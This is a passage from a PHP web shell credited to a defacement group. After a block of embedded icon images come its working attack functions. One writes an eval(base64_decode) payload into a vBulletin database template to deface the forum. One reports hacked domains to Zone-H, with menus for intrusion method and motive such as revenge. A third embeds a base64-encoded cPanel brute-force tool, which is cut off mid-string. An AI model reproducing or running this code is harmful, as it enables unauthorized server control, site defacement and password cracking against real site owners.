"LXd+WWEHLUd/ToJFZQOOj5CRjiCBlZaXIBEAOw==",
"ext_asp"=>
"R0lGODdhEAAQALMAAAAAAIAAAACAAICAAAAAgIAAgACAgMDAwICAgP8AAAD/AP//AAAA//8A/wD/".
"/////ywAAAAAEAAQAAAESvDISasF2N6DMNAS8Bxfl1UiOZYe9aUwgpDTq6qP/IX0Oz7AXU/1eRgI".
"D6HPhzjSeLYdYabsDCWMZwhg3WWtKK4QrMHohCAS+hABADs=",
"ext_mp3"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///4CAgMDAwICAAP//AAAAAAAAAANU".
"aGrS7iuKQGsYIqpp6QiZRDQWYAILQQSA2g2o4QoASHGwvBbAN3GX1qXA+r1aBQHRZHMEDSYCz3fc".
"IGtGT8wAUwltzwWNWRV3LDnxYM1ub6GneDwBADs=",
"ext_avi"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///4CAgMDAwP8AAAAAAAAAAAAAAANM".
"WFrS7iuKQGsYIqpp6QiZ1FFACYijB4RMqjbY01DwWg44gAsrP5QFk24HuOhODJwSU/IhBYTcjxe4".
"PYXCyg+V2i44XeRmSfYqsGhAAgA7",
"ext_cgi"=>
"R0lGODlhEAAQAGYAACH5BAEAAEwALAAAAAAQABAAhgAAAJtqCHd3d7iNGa+HMu7er9GiC6+IOOu9".
"DkJAPqyFQql/N/Dlhsyyfe67Af/SFP/8kf/9lD9ETv/PCv/cQ//eNv/XIf/ZKP/RDv/bLf/cMah6".
"LPPYRvzgR+vgx7yVMv/lUv/mTv/fOf/MAv/mcf/NA//qif/MAP/TFf/xp7uZVf/WIP/OBqt/Hv/S".
"Ev/hP+7OOP/WHv/wbHNfP4VzV7uPFv/pV//rXf/ycf/zdv/0eUNJWENKWsykIk9RWMytP//4iEpQ".
"Xv/9qfbptP/uZ93GiNq6XWpRJ//iQv7wsquEQv/jRAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegEyCg0wBhIeHAYqIjAEwhoyEAQQXBJCRhQMuA5eSiooGIwafi4UM".
"BagNFBMcDR4FQwwBAgEGSBBEFSwxNhAyGg6WAkwCBAgvFiUiOBEgNUc7w4ICND8PKCFAOi0JPNKD".
"AkUnGTkRNwMS34MBJBgdRkJLCD7qggEPKxsJKiYTBweJkjhQkk7AhxQ9FqgLMGBGkG8KFCg8JKAi".
"RYtMAgEAOw==",
"ext_cmd"=>
"R0lGODlhEAAQACIAACH5BAEAAAcALAAAAAAQABAAggAAAP///4CAgMDAwAAAgICAAP//AAAAAANI".
"eLrcJzDKCYe9+AogBvlg+G2dSAQAipID5XJDIM+0zNJFkdL3DBg6HmxWMEAAhVlPBhgYdrYhDQCN".
"dmrYAMn1onq/YKpjvEgAADs=",
"ext_cpp"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANC".
"WLPc9XCASScZ8MlKicobBwRkEIkVYWqT4FICoJ5v7c6s3cqrArwinE/349FiNoFw44rtlqhOL4Ra".
"Eq7YrLDE7a4SADs=",
"ext_ini"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP///8DAwICAgICAAP//AAAAAAAAAANL".
"aArB3ioaNkK9MNbHs6lBKIoCoI1oUJ4N4DCqqYBpuM6hq8P3hwoEgU3mawELBEaPFiAUAMgYy3VM".
"SnEjgPVarHEHgrB43JvszsQEADs=",
"ext_diz"=>
"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAP///15phcfb6NLs/7Pc/+P0/3J+l9bs".
"/52nuqjK5/n///j///7///r//0trlsPn/8nn/8nZ5trm79nu/8/q/9Xt/9zw/93w/+j1/9Hr/+Dv".
"/d7v/73H0MjU39zu/9br/8ne8tXn+K6/z8Xj/LjV7dDp/6K4y8bl/5O42Oz2/7HW9Ju92u/9/8T3".
"/+L//+7+/+v6/+/6/9H4/+X6/+Xl5Pz//+/t7fX08vD//+3///P///H///P7/8nq/8fp/8Tl98zr".
"/+/z9vT4++n1/b/k/dny/9Hv/+v4/9/0/9fw/8/u/8vt/+/09xUvXhQtW4KTs2V1kw4oVTdYpDZX".
"pVxqhlxqiExkimKBtMPL2Ftvj2OV6aOuwpqlulyN3cnO1wAAXQAAZSM8jE5XjgAAbwAAeURBYgAA".
"dAAAdzZEaE9wwDZYpmVviR49jG12kChFmgYuj6+1xeLn7Nzj6pm20oeqypS212SJraCyxZWyz7PW".
"9c/o/87n/8DX7MHY7q/K5LfX9arB1srl/2+fzq290U14q7fCz6e2yXum30FjlClHc4eXr6bI+bTK".
"4rfW+NXe6Oby/5SvzWSHr+br8WuKrQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAjgACsJrDRHSICDQ7IMXDgJx8EvZuIcbPBooZwbBwOMAfMmYwBCA2sEcNBjJCMYATLIOLiokocm".
"C1QskAClCxcGBj7EsNHoQAciSCC1mNAmjJgGGEBQoBHigKENBjhcCBAIzRoGFkwQMNKnyggRSRAg".
"2BHpDBUeewRV0PDHCp4BSgjw0ZGHzJQcEVD4IEHJzYkBfo4seYGlDBwgTCAAYvFE4KEBJYI4UrPF".
"CyIIK+woYjMwQQI6Cor8mKEnxR0nAhYKjHJFQYECkqSkSa164IM6LhLRrr3wwaBCu3kPFKCldkAA".
"Ow==",
"ext_doc"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAggAAAP///8DAwAAA/4CAgAAAAAAAAAAAAANR".
"WErcrrCQQCslQA2wOwdXkIFWNVBA+nme4AZCuolnRwkwF9QgEOPAFG21A+Z4sQHO94r1eJRTJVmq".
"MIOrrPSWWZRcza6kaolBCOB0WoxRud0JADs=",
"ext_exe"=>
"R0lGODlhEwAOAKIAAAAAAP///wAAvcbGxoSEhP///wAAAAAAACH5BAEAAAUALAAAAAATAA4AAAM7".
"WLTcTiWSQautBEQ1hP+gl21TKAQAio7S8LxaG8x0PbOcrQf4tNu9wa8WHNKKRl4sl+y9YBuAdEqt".
"xhIAOw==",
"ext_h"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANB".
"WLPc9XCASScZ8MlKCcARRwVkEAKCIBKmNqVrq7wpbMmbbbOnrgI8F+q3w9GOQOMQGZyJOspnMkKo".
"Wq/NknbbSgAAOw==",
"ext_hpp"=>
"R0lGODlhEAAQACIAACH5BAEAAAUALAAAAAAQABAAgv///wAAAAAAgICAgMDAwAAAAAAAAAAAAANF".
"WLPc9XCASScZ8MlKicobBwRkEAGCIAKEqaFqpbZnmk42/d43yroKmLADlPBis6LwKNAFj7jfaWVR".
"UqUagnbLdZa+YFcCADs=",
"ext_htaccess"=>
"R0lGODlhEAAQACIAACH5BAEAAAYALAAAAAAQABAAggAAAP8AAP8A/wAAgIAAgP//AAAAAAAAAAM6".
"WEXW/k6RAGsjmFoYgNBbEwjDB25dGZzVCKgsR8LhSnprPQ406pafmkDwUumIvJBoRAAAlEuDEwpJ".
"AAA7",
"ext_html"=>
"R0lGODlhEwAQALMAAAAAAP///2trnM3P/FBVhrPO9l6Itoyt0yhgk+Xy/WGp4sXl/i6Z4mfd/HNz".
"c////yH5BAEAAA8ALAAAAAATABAAAAST8Ml3qq1m6nmC/4GhbFoXJEO1CANDSociGkbACHi20U3P".
"KIFGIjAQODSiBWO5NAxRRmTggDgkmM7E6iipHZYKBVNQSBSikukSwW4jymcupYFgIBqL/MK8KBDk".
"Bkx2BXWDfX8TDDaFDA0KBAd9fnIKHXYIBJgHBQOHcg+VCikVA5wLpYgbBKurDqysnxMOs7S1sxIR".
"ADs=",
"ext_jpg"=>
"R0lGODlhEAAQADMAACH5BAEAAAkALAAAAAAQABAAgwAAAP///8DAwICAgICAAP8AAAD/AIAAAACA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARccMhJk70j6K3FuFbGbULwJcUhjgHgAkUqEgJNEEAgxEci".
"Ci8ALsALaXCGJK5o1AGSBsIAcABgjgCEwAMEXp0BBMLl/A6x5WZtPfQ2g6+0j8Vx+7b4/NZqgftd".
"FxEAOw==",
"ext_js"=>
"R0lGODdhEAAQACIAACwAAAAAEAAQAIL///8AAACAgIDAwMD//wCAgAAAAAAAAAADUCi63CEgxibH".
"k0AQsG200AQUJBgAoMihj5dmIxnMJxtqq1ddE0EWOhsG16m9MooAiSWEmTiuC4Tw2BB0L8FgIAhs".
"a00AjYYBbc/o9HjNniUAADs=",
"ext_lnk"=>
"R0lGODlhEAAQAGYAACH5BAEAAFAALAAAAAAQABAAhgAAAABiAGPLMmXMM0y/JlfFLFS6K1rGLWjO".
"NSmuFTWzGkC5IG3TOo/1XE7AJx2oD5X7YoTqUYrwV3/lTHTaQXnfRmDGMYXrUjKQHwAMAGfNRHzi".
"Uww5CAAqADOZGkasLXLYQghIBBN3DVG2NWnPRnDWRwBOAB5wFQBBAAA+AFG3NAk5BSGHEUqwMABk".
"AAAgAAAwAABfADe0GxeLCxZcDEK6IUuxKFjFLE3AJ2HHMRKiCQWCAgBmABptDg+HCBZeDAqFBWDG".
"MymUFQpWBj2fJhdvDQhOBC6XF3fdR0O6IR2ODwAZAHPZQCSREgASADaXHwAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeZgFBQPAGFhocAgoI7Og8JCgsEBQIWPQCJgkCOkJKUP5eYUD6PkZM5".
"NKCKUDMyNTg3Agg2S5eqUEpJDgcDCAxMT06hgk26vAwUFUhDtYpCuwZByBMRRMyCRwMGRkUg0xIf".
"1lAeBiEAGRgXEg0t4SwroCYlDRAn4SmpKCoQJC/hqVAuNGzg8E9RKBEjYBS0JShGh4UMoYASBiUQ".
"ADs=",
"ext_log"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAMDAwICAgICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARQEKEwK6UyBzC475gEAltJklLRAWzbClRhrK4Ly5yg7/wN".
"zLUaLGBQBV2EgFLV4xEOSSWt9gQQBpRpqxoVNaPKkFb5Eh/LmUGzF5qE3+EMIgIAOw==",
"ext_php"=>
"R0lGODlhEAAQAIABAAAAAP///ywAAAAAEAAQAAACJkQeoMua1tBxqLH37HU6arxZYLdIZMmd0OqpaGeyYpqJlRG/rlwAADs=",
"ext_pl"=>
"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo".
"GLrc3gOAMYR4OOudreegRlBWSJ1lqK5s64LjWF3cQMjpJpDf6//ABAA7",
"ext_swf"=>
"R0lGODlhFAAUAMQRAP+cnP9SUs4AAP+cAP/OAIQAAP9jAM5jnM6cY86cnKXO98bexpwAAP8xAP/O".
"nAAAAP///////wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAEA".
"ABEALAAAAAAUABQAAAV7YCSOZGme6PmsbMuqUCzP0APLzhAbuPnQAweE52g0fDKCMGgoOm4QB4GA".
"GBgaT2gMQYgVjUfST3YoFGKBRgBqPjgYDEFxXRpDGEIA4xAQQNR1NHoMEAACABFhIz8rCncMAGgC".
"NysLkDOTSCsJNDJanTUqLqM2KaanqBEhADs=",
"ext_tar"=>
"R0lGODlhEAAQAGYAACH5BAEAAEsALAAAAAAQABAAhgAAABlOAFgdAFAAAIYCUwA8ZwA8Z9DY4JIC".
"Wv///wCIWBE2AAAyUJicqISHl4CAAPD4/+Dg8PX6/5OXpL7H0+/2/aGmsTIyMtTc5P//sfL5/8XF".
"HgBYpwBUlgBWn1BQAG8aIABQhRbfmwDckv+H11nouELlrizipf+V3nPA/40CUzmm/wA4XhVDAAGD".
"UyWd/0it/1u1/3NzAP950P990mO5/7v14YzvzXLrwoXI/5vS/7Dk/wBXov9syvRjwOhatQCHV17p".
"uo0GUQBWnP++8Lm5AP+j5QBUlACKWgA4bjJQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAAAAAeegAKCg4SFSxYNEw4gMgSOj48DFAcHEUIZREYoJDQzPT4/AwcQCQkg".
"GwipqqkqAxIaFRgXDwO1trcAubq7vIeJDiwhBcPExAyTlSEZOzo5KTUxMCsvDKOlSRscHDweHkMd".
"HUcMr7GzBufo6Ay87Lu+ii0fAfP09AvIER8ZNjc4QSUmTogYscBaAiVFkChYyBCIiwXkZD2oR3FB".
"u4tLAgEAOw==",
"ext_txt"=>
"R0lGODlhEwAQAKIAAAAAAP///8bGxoSEhP///wAAAAAAAAAAACH5BAEAAAQALAAAAAATABAAAANJ".
"SArE3lDJFka91rKpA/DgJ3JBaZ6lsCkW6qqkB4jzF8BS6544W9ZAW4+g26VWxF9wdowZmznlEup7".
"UpPWG3Ig6Hq/XmRjuZwkAAA7",
"ext_wri"=>
"R0lGODlhEAAQADMAACH5BAEAAAgALAAAAAAQABAAg////wAAAICAgMDAwICAAAAAgAAA////AAAA".
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAARRUMhJkb0C6K2HuEiRcdsAfKExkkDgBoVxstwAAypduoao".
"a4SXT0c4BF0rUhFAEAQQI9dmebREW8yXC6Nx2QI7LrYbtpJZNsxgzW6nLdq49hIBADs=",
"ext_xml"=>
"R0lGODlhEAAQAEQAACH5BAEAABAALAAAAAAQABAAhP///wAAAPHx8YaGhjNmmabK8AAAmQAAgACA".
"gDOZADNm/zOZ/zP//8DAwDPM/wAA/wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA".
"AAAAAAAAAAAAAAAAAAVk4CCOpAid0ACsbNsMqNquAiA0AJzSdl8HwMBOUKghEApbESBUFQwABICx".
"OAAMxebThmA4EocatgnYKhaJhxUrIBNrh7jyt/PZa+0hYc/n02V4dzZufYV/PIGJboKBQkGPkEEQ".
"IQA7"
);
//Untuk optimalisasi ukuran dan kecepatan.
$imgequals = array(
  "ext_tar"=>array("ext_tar","ext_r00","ext_ace","ext_arj","ext_bz","ext_bz2","ext_tbz","ext_tbz2","ext_tgz","ext_uu","ext_xxe","ext_zip","ext_cab","ext_gz","ext_iso","ext_lha","ext_lzh","ext_pbk","ext_rar","ext_uuf"),
  "ext_php"=>array("ext_php","ext_php3","ext_php4","ext_php5","ext_phtml","ext_shtml","ext_htm"),
  "ext_jpg"=>array("ext_jpg","ext_gif","ext_png","ext_jpeg","ext_jfif","ext_jpe","ext_bmp","ext_ico","ext_tif","tiff"),
  "ext_html"=>array("ext_html","ext_htm"),
  "ext_avi"=>array("ext_avi","ext_mov","ext_mvi","ext_mpg","ext_mpeg","ext_wmv","ext_rm"),
  "ext_lnk"=>array("ext_lnk","ext_url"),
  "ext_ini"=>array("ext_ini","ext_css","ext_inf"),
  "ext_doc"=>array("ext_doc","ext_dot"),
  "ext_js"=>array("ext_js","ext_vbs"),
  "ext_cmd"=>array("ext_cmd","ext_bat","ext_pif"),
  "ext_wri"=>array("ext_wri","ext_rtf"),
  "ext_swf"=>array("ext_swf","ext_fla"),
  "ext_mp3"=>array("ext_mp3","ext_au","ext_midi","ext_mid"),
  "ext_htaccess"=>array("ext_htaccess","ext_htpasswd","ext_ht","ext_hta","ext_so")
);
if (!$getall) {
  header("Content-type: image/gif");
  header("Cache-control: public");
  header("Expires: ".date("r",mktime(0,0,0,1,1,2030)));
  header("Cache-control: max-age=".(60*60*24*7));
  header("Last-Modified: ".date("r",filemtime(__FILE__)));
  foreach($imgequals as $k=>$v) {if (in_array($img,$v)) {$img = $k; break;}}
  if (empty($images[$img])) {$img = "small_unk";}
  if (in_array($img,$ext_tar)) {$img = "ext_tar";}
  echo base64_decode($images[$img]);
}
else {
  foreach($imgequals as $a=>$b) {foreach ($b as $d) {if ($a != $d) {if (!empty($images[$d])) {echo("Warning! Remove \$images[".$d."]<br>");}}}}
  natsort($images);
  $k = array_keys($images);
  echo  "<center>";
  foreach ($k as $u) {echo $u.":<img src=\"".$surl."act=img&img=".$u."\" border=\"1\"><br>";}
  echo "</center>";
}
exit;
}
if ($act == "vbchange") {
if(empty($_POST['index'])){
echo "<FORM method=\"POST\">
host : <INPUT size=\"15\" value=\"localhost\" name=\"localhost\" type=\"text\">
database : <INPUT size=\"15\" value=\"forum_vb\" name=\"database\" type=\"text\"><br>
username : <INPUT size=\"15\" value=\"forum_vb\" name=\"username\" type=\"text\">
password : <INPUT size=\"15\" value=\"vb\" name=\"password\" type=\"password\"><br>
      <br>
<textarea name=\"index\" cols=\"70\" rows=\"30\">Set Your Index</textarea><br>
<INPUT value=\"Set\" name=\"send\" type=\"submit\">
</FORM>";
}else{
$localhost = $_POST['localhost'];
$database  = $_POST['database'];
$username  = $_POST['username'];
$password  = $_POST['password'];
$index     = $_POST['index'];
         @mysql_connect($localhost,$username,$password) or die(mysql_error());
         @mysql_select_db($database) or die(mysql_error());

$index=str_replace("\'","'",$index);

$set_index  = "{\${eval(base64_decode(\'";

$set_index .= base64_encode("echo \"$index\";");


$set_index .= "\'))}}{\${exit()}}</textarea>";

$ok=@mysql_query("UPDATE template SET template ='".$set_index."' WHERE title ='spacer_open'") or die(mysql_error());

if($ok){
echo "!! update finish !!<br><br>";
}}}


if ($act == "zone") {

$title = '<b><i><u><center><h2>Zone-H Notifier | By -{ Damane2011 }-</h2></center></u></i></b>';

$damane = '<b><center>-|Created By Damane2011 Email:abdou2010new@hotmail.fr |-</center></b>';

echo $title;

if($_POST) {

$hacker = $_POST['defacer'];

$method = $_POST['hackmode'];

$reason = $_POST['reason'];

$site = $_POST['domain'];




if ($hacker == "") {



die ("<center>Put Your Notifier Name:<center>");

}

elseif($method == "--------SELECT--------") {

die("<center>The Method Of Hacking:</center>");

}

elseif($reason == "--------SELECT--------") {



die("<center>The Reason Of Hacking:</center>");

}

elseif($site == "") {



die("<center>Domain Hacked:</center>");

}





$i = 0;

$sites = explode("\n", $site);

while($i < count($sites)) {

if(substr($sites[$i], 0, 4) != "http") {

$sites[$i] = "http://".$sites[$i];



}



poster("http://zone-h.org/notify/single", $hacker, $method, $reason, $sites[$i]);



++$i;

}

echo '<center><p><font color="green">Recording Is Done</font></p></center>';



}else{



echo '<center>


<form action="" method="post">

<div id="option">

<p><b><i><font color="red">Notifier :</font> </i></b><br />

<span class="ok"><input type="text" name="defacer" size="40" /></span> </p>



<p><b><i><font color="green">How You Have Been Hacked The Website</font></i></b><br /><select name="hackmode">

<option >--------SELECT--------</option>

<option value="1">known vulnerability (i.e. unpatched system)</option>

<option

value="2" >undisclosed (new) vulnerability</option>

<option

value="3" >configuration / admin. mistake</option>

<option

value="4" >brute force attack</option>



<option

value="5" >social engineering</option>

<option

value="6" >Web Server intrusion</option>

<option

value="7" >Web Server external module intrusion</option>

<option

value="8" >Mail Server intrusion</option>

<option

value="9" >FTP Server intrusion</option>

<option

value="10" >SSH Server intrusion</option>



<option

value="11" >Telnet Server intrusion</option>

<option

value="12" >RPC Server intrusion</option>

<option

value="13" >Shares misconfiguration</option>

<option

value="14" >Other Server intrusion</option>

<option

value="15" >SQL Injection</option>

<option

value="16" >URL Poisoning</option>



<option

value="17" >File Inclusion</option>

<option

value="18" >Other Web Application bug</option>

<option

value="19" >Remote administrative panel access through bruteforcing</option>

<option

value="20" >Remote administrative panel access through password guessing</option>

<option

value="21" >Remote administrative panel access through social engineering</option>

<option

value="22" >Attack against the administrator/user (password stealing/sniffing)</option>



<option

value="23" >Access credentials through Man In the Middle attack</option>

<option

value="24" >Remote service password guessing</option>

<option

value="25" >Remote service password bruteforce</option>

<option

value="26" >Rerouting after attacking the Firewall</option>

<option

value="27" >Rerouting after attacking the Router</option>

<option

value="28" >DNS attack through social engineering</option>



<option

value="29" >DNS attack through cache poisoning</option>

<option

value="30" >Not available</option>

</select></p>

<p><b><i><font color="red">Why You Have Been Haked It</font></i></b><br /><select name="reason">



<option >--------SELECT--------</option>

<option

value="1" >Heh...just for fun!</option>

<option

value="2" >Revenge against that website</option>

<option

value="3" >Political reasons</option>

<option

value="4" >As a challenge</option>

<option

value="5" >I just want to be the best defacer</option>



<option

value="6" >Patriotism</option>

<option

value="7" >Not available</option>

</select> </p>



<p>------------<br />

<span class="fur"><b><i><font color="green">Website List:</font></i></b></span><br />

<span class=""><textarea name="domain" cols="43" rows="17"></textarea></span> </p>

<p><input type="submit" value="SEND" />


</div>

</center>';



}



function poster($url, $hacker, $hackmode,$reson, $site )

{



$k = curl_init();

curl_setopt($k, CURLOPT_URL, $url);

curl_setopt($k,CURLOPT_POST,true);

curl_setopt($k, CURLOPT_POSTFIELDS,"defacer=".$hacker."&domain1=". $site."&hackmode=".$hackmode."&reason=".$reson);

curl_setopt($k,CURLOPT_FOLLOWLOCATION, true);

curl_setopt($k, CURLOPT_RETURNTRANSFER, true);



$kubra = curl_exec($k);

curl_close($k);

return $kubra;

}

echo $damane;

}

if ($act == "about") {
  echo "<center><b>Created & Developped By:</b><br>DAMANE2011 Member Of Anonymos-Dz <a href=\"mailto:damanedz@hotmail.com\">DAMANE2011</a></b>";
}
if ($act == "cpn") {

$crackftp = 'PGh0bWw+DQo8dGl0bGU+Y1BhbmVsIFR1cmJvIEZvcmNlIHYyPC90aXRsZT4NCjxtZXRhIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PXV0Zi04IiAvPg0KPD9waHANCi8qDQpUdXJibyBGb3JjZSBCeSBUcnlhZy5DYw0KKi8NCkBzZXRfdGltZV9saW1pdCgwKTsNCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQoNCg0KZWNobyAnPGhlYWQ+DQoNCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+DQo8IS0tDQpib2R5IHsNCgliYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwOw0KICAgIGZvbnQtc2l6ZTogMThweDsNCgljb2xvcjogI2NjY2NjYzsNCn0NCmlucHV0LHRleHRhcmVhLHNlbGVjdHsNCmZvbnQtd2VpZ2h0OiBib2xkOw0KY29sb3I6ICNjY2NjY2M7DQpkYXNoZWQgI2ZmZmZmZjsNCmJvcmRlcjogMXB4DQpzb2xpZCAjMkMyQzJDOw0KYmFja2dyb3VuZC1jb2xvcjogIzA4MDgwOA0KfQ0KYSB7DQoJYmFja2dyb3VuZC1jb2xvcjogIzE1MTUxNTsNCgl2ZXJ0aWNhbC1hbGlnbjogYm90dG9tOw0KCWNvbG9yOiAjMDAwOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCglmb250LXNpemU6IDIwcHg7DQoJbWFyZ2luOiA4cHg7DQoJcGFkZGluZzogNnB4Ow0KCWJvcmRlcjogdGhpbiBzb2xpZCAjMDAwOw0KfQ0KYTpob3ZlciB7DQoJYmFja2dyb3VuZC1jb2xvcjogIzA4MDgwODsNCgl2ZXJ0aWNhbC1hbGlnbjogYm90dG9tOw0KCWNvbG9yOiAjMzMzOw0KCXRleHQtZGVjb3JhdGlvbjogbm9uZTsNCglmb250LXNpemU6IDIwcHg7DQoJbWFyZ2luOiA4cHg7DQoJcGFkZGluZzogNnB4Ow0KCWJvcmRlcjogdGhpbiBzb2xpZCAjMDAwOw0KfQ0KLnN0eWxlMSB7DQoJdGV4dC1hbGlnbjogY2VudGVyOw0KfQ0KLnN0eWxlMiB7DQoJY29sb3I6ICNGRkZGRkY7DQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQouc3R5bGUzIHsNCgljb2xvcjogI0ZGRkZGRjsNCn0NCi0tPg0KPC9zdHlsZT4NCg0KPC9oZWFkPg0KJzsNCg0KDQpmdW5jdGlvbiBpbigkdHlwZSwkbmFtZSwkc2l6ZSwkdmFsdWUsJGNoZWNrZWQ9MCkgDQogew0KICRyZXQgPSAiPGlucHV0IHR5cGU9Ii4kdHlwZS4iIG5hbWU9Ii4kbmFtZS4iICI7IGlmKCRzaXplICE9IDApIA0KIHsNCiAkcmV0IC49ICJzaXplPSIuJHNpemUuIiAiOyB9DQogJHJldCAuPSAidmFsdWU9XCIiLiR2YWx1ZS4iXCIiOyBpZigkY2hlY2tlZCkgJHJldCAuPSAiIGNoZWNrZWQiOyByZXR1cm4gJHJldC4iPiI7IH0NCiANCmNsYXNzIG15X3NxbCANCiB7DQogdmFyICRob3N0ID0gJ2xvY2FsaG9zdCc7IHZhciAkcG9ydCA9ICcnOyB2YXIgJHVzZXIgPSAnJzsgdmFyICRwYXNzID0gJyc7IHZhciAkYmFzZSA9ICcnOyB2YXIgJGRiID0gJyc7IHZhciAkY29ubmVjdGlvbjsgdmFyICRyZXM7IHZhciAkZXJyb3I7IHZhciAkcm93czsgdmFyICRjb2x1bW5zOyB2YXIgJG51bV9yb3dzOyB2YXIgJG51bV9maWVsZHM7IHZhciAkZHVtcDsgZnVuY3Rpb24gY29ubmVjdCgpIA0KIHsNCiBzd2l0Y2goJHRoaXMtPmRiKSANCiB7DQogY2FzZSAnTXlTUUwnOiBpZihlbXB0eSgkdGhpcy0+cG9ydCkpIA0KIHsNCiAkdGhpcy0+cG9ydCA9ICczMzA2JzsgfQ0KIGlmKCFmdW5jdGlvbl9leGlzdHMoJ215c3FsX2Nvbm5lY3QnKSkgcmV0dXJuIDA7ICR0aGlzLT5jb25uZWN0aW9uID0gQG15c3FsX2Nvbm5lY3QoJHRoaXMtPmhvc3QuJzonLiR0aGlzLT5wb3J0LCR0aGlzLT51c2VyLCR0aGlzLT5wYXNzKTsgaWYoaXNfcmVzb3VyY2UoJHRoaXMtPmNvbm5lY3Rpb24pKSByZXR1cm4gMTsgJHRoaXMtPmVycm9yID0gQG15c3FsX2Vycm5vKCkuIiA6ICIuQG15c3FsX2Vycm9yKCk7IGJyZWFrOyBjYXNlICdNU1NRTCc6IGlmKGVtcHR5KCR0aGlzLT5wb3J0KSkgDQogew0KICR0aGlzLT5wb3J0ID0gJzE0MzMnOyB9DQogaWYoIWZ1bmN0aW9uX2V4aXN0cygnbXNzcWxfY29ubmVjdCcpKSByZXR1cm4gMDsgJHRoaXMtPmNvbm5lY3Rpb24gPSBAbXNzcWxfY29ubmVjdCgkdGhpcy0+aG9zdC4nLCcuJHRoaXMtPnBvcnQsJHRoaXMtPnVzZXIsJHRoaXMtPnBhc3MpOyBpZigkdGhpcy0+Y29ubmVjdGlvbikgcmV0dXJuIDE7ICR0aGlzLT5lcnJvciA9ICJDYW4ndCBjb25uZWN0IHRvIHNlcnZlciI7IGJyZWFrOyBjYXNlICdQb3N0Z3JlU1FMJzogaWYoZW1wdHkoJHRoaXMtPnBvcnQpKSANCiB7DQogJHRoaXMtPnBvcnQgPSAnNTQzMic7IH0NCiAkc3RyID0gImhvc3Q9JyIuJHRoaXMtPmhvc3QuIicgcG9ydD0nIi4kdGhpcy0+cG9ydC4iJyB1c2VyPSciLiR0aGlzLT51c2VyLiInIHBhc3N3b3JkPSciLiR0aGlzLT5wYXNzLiInIGRibmFtZT0nIi4kdGhpcy0+YmFzZS4iJyI7IGlmKCFmdW5jdGlvbl9leGlzdHMoJ3BnX2Nvbm5lY3QnKSkgcmV0dXJuIDA7ICR0aGlzLT5jb25uZWN0aW9uID0gQHBnX2Nvbm5lY3QoJHN0cik7IGlmKGlzX3Jlc291cmNlKCR0aGlzLT5jb25uZWN0aW9uKSkgcmV0dXJuIDE7ICR0aGlzLT5lcnJvciA9IEBwZ19sYXN0X2Vycm9yKCR0aGlzLT5jb25uZWN0aW9uKTsgYnJlYWs7IGNhc2UgJ09yYWNsZSc6IGlmKCFmdW5jdGlvbl9leGlzdHMoJ29jaWxvZ29uJykpIHJldHVybiAwOyAkdGhpcy0+Y29ubmVjdGlvbiA9IEBvY2lsb2dvbigkdGhpcy0+dXNlciwgJHRoaXMtPnBhc3MsIC